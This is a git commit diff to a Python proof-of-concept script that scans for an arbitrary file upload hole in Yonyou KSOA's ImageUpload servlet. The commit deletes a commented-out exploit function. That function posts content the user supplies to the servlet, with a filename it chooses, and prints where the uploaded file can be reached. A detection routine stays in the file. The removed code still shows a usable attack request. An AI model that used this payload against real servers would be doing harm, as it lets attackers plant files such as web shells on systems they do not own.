8ecb6c1028c3b58527a933a19acd1ca040344a5f
cx3301433 <168405637+cx3301433@users.noreply.github.com>
2024-06-27 09:13:25 +0800

    Update yyUpload.py

--- 用友时空KSOA ImageUpload 任意文件上传漏洞/yyUpload.py
+++ 用友时空KSOA ImageUpload 任意文件上传漏洞/yyUpload.py
@@ -34,8 +34,6 @@ def main():
     #如果用户输入url而不是file时：
     if args.url and not args.file:
         poc(args.url)
-        # if poc(args.url):
-        #     exp(args.url)
     #如果用户输入file而不是url时：
     elif args.file and not args.url:
         url_list=[]
@@ -80,36 +78,6 @@ def poc(target):
     except:
         print(f'[***]该{target}存在问题，请手动测试')
         return False
-    
-# def exp(target):
-#     print("--------------正在进行漏洞利用-------------")
-#     time.sleep(2)
-#     fname = input("请输入文件名：")
-#     text = input("输入文件内容:")
-#     payload = f'/servlet/com.sksoft.bill.ImageUpload?filename={fname}&filepath=/'
-#     url = target+payload
-#     header = {
-#         "User-Agent": "Java/1.8.0_381",
-#         "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
-#         "Content-type": "",
-#         "Content-Length": "5",
-#         "Connection": "close",
-#     }
-#     data =(
-#         f"{text}"
-#         )
-#     result = target +'/pictures/'+ fname
-#     try:
-#         res1 = requests.post(url=url,headers=header,data=data,verify=False)
-#         if res1.status_code == 200 and 'root' in res1.text:
-#             print(f'上传后的url为:{result}')
-#         else:
-#             print(f'该{target}不存在该漏洞')
-#         return False
-#     except:
-#         print(f'该{target}存在问题，请手动测试')
-#         return False
-
 
 if __name__ == '__main__':
     main()
